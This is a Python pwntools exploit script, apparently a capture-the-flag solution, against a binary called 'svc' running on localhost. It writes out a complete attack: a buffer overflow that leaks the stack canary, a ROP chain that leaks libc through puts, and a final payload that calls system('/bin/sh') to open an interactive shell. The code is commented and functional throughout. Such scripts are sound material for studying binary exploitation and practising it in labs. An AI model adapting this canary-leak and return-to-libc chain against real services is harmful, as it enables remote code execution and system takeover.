# Import pwntools
from pwn import *

target = remote("localhost","12345")

elf = ELF('svc')


# 0x0000000000400ea3 : pop rdi ; ret
# ROPgadget.py --binary svc | grep "pop rdi"
popRdi = p64(0x400ea3)

gotPuts = p64(0x602018)
# pltPuts = p64(0x4008cc) # This goes to nopl
pltPuts = p64(0x4008d0)

offsetPuts = 0x6f690
offsetSystem = 0x45390
offsetBinsh = 0x18cd57

startMain = p64(0x400a96)

# Establish fucntions to handle I/O with the target
def feed(data):
  print(target.recvuntil(b">>"))
  target.sendline(b'1')
  print(target.recvuntil(b">>"))
  target.send(data)

def review():
  print(target.recvuntil(b">>"))
  target.sendline(b'2')
  #print target.recvuntil("[*]PLEASE TREAT HIM WELL.....\n-------------------------\n")
  #leak = target.recvuntil("-------------------------").replace("-------------------------", "")
  print(target.recvuntil(b"0"*0xa9))
  canaryLeak = target.recv(7)
  canary = u64(b"\x00" + canaryLeak)
  print("canary is: " + hex(canary))
  return canary

def leave():
  print(target.recvuntil(b">>"))
  target.sendline(b"3")

# Start of with the canary leak. We will overflow the buffer write up to the stack canary, and overwrite the least signifcant byte of the canary
leakCanary = b""
leakCanary += b"0"*0xa8 # Fill up space up to the canary
leakCanary += b"0" # Overwrite least significant byte of the canary



feed(leakCanary) # Execute the overwrite

canary = review() # Leak the canary, and parse it out

# Start the rop chain to give us a libc infoleak
leakLibc = b""
leakLibc += b"0"*0xa8 # Fill up space up to the canary
leakLibc += p64(canary) # Overwrite the stack canary with itself
leakLibc += b"1"*0x8 # 8 more bytes until the return address
leakLibc += popRdi # Pop got entry for puts in rdi register
leakLibc += gotPuts # GOT address of puts
leakLibc += pltPuts # PLT address of puts
leakLibc += startMain # Loop back around to the start of main

# Send the payload to leak libc
feed(leakLibc)

# Return to execute our code
leave()

# Scan in and parse out the infoleak

print(target.recvuntil(b"[*]BYE ~ TIME TO MINE MIENRALS...\x0a"))

putsLeak = target.recvline().replace(b"\x0a", b"")

putsLibc = u64(putsLeak + b"\x00"*(8-len(putsLeak)))

# Calculate the needed addresses

libcBase = putsLibc - offsetPuts
systemLibc = libcBase + offsetSystem
binshLibc = libcBase + offsetBinsh

print("libc base: " + hex(libcBase))

# Form the payload to return to system

payload = b""
payload += b"0"*0xa8
payload += p64(canary)
payload += b"1"*0x8
payload += popRdi # Pop "/bin/sh" into the rdi register, where it expects it's argument (single char pointer)
payload += p64(binshLibc) # Address to '/bin/sh'
payload += p64(systemLibc) # Libc address of system

# Send the final payload
feed(payload)

target.sendline("3")

#feed(payload)

# Return to execute our code, return to system and get a shell
#leave()

target.interactive()